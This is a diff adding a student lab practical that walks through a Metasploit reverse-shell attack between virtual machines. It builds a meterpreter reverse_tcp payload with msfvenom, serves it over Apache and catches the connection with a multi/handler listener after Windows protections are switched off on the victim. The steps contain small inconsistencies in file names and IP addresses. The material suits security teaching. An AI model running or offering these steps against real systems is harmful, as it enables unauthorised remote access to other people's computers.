@@ -1,0 +1,50 @@
+Practical No 10
+Aim: To perform screenshare attack using Metasploit 
+
+Step 1: Open Kali Linux terminal. 
+Step 2: Right click and open Terminal
+Step 3: Find the our system’s IP address using ifconfig. 
+Step 4: Type "sudo su abd "enter the password : kali (by default kali linux has password as kali) 
+Step 5: To create the malicious payload that will connect back to the attacker machine. 
+Run command :- msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.235.128 LPORT=123 -f exe -o C4.exe 
+Make sure LHOST is your Ip address from Step 3 
+
+Step 6:-Type ls for checking that payload is exist or not 
+➔ Move the generated payload to /var/www/html directory. 
+Command:-mv payload.exe /var/www/html 
+➔Start Apache Web Server 
+Command:-service apache2 start
+
+Step 7:- Open New Tab In The Terminal 
+➔ Start Metasploit Framework using 
+Command:-sudo msfconsole.
+
+Step 8:- Use the module➔Command:- exploit/multi/handler 
+Set the payload ➔ Command:-windows/meterpreter/reverse_tcp. 
+To Set LHOST to your our system’s IP and LPORT to the chosen port commad:- 
+set LHOST 192.168.153.131 (NOTE:- IP Address in Step 3)
+
+Step 9:- 
+Then open Another virtual machine and Go to setting➔Virus and Threat Protection➔ Off 
+all the firewalls 
+Then in chrome type this 192.168.153.131/payload.exe(Note that IP address should the 
+same as you mention in Step3) 
+
+Step 10:-After running this you will see the file is downloading
+
+Step 11:- Go to downloads and open the payload file 
+➔Then go to kali linux virtual machine we have get the access of the another virtual 
+machine 
+
+Step 12:- To check the access of the victim machine run the following command 
+➔sysinfo
+
+If the command runs that means your have successfully get access (hacked) of that 
+victims system
+
+Step 13:-At the end go to 1st window of terminal and stop the apache2 server by 
+following command 
+➔service apache2 stop 
+
+Step 14:-For exiting from that hacked system type exit till the terminal close.(same for 
+2nd window of the terminal)
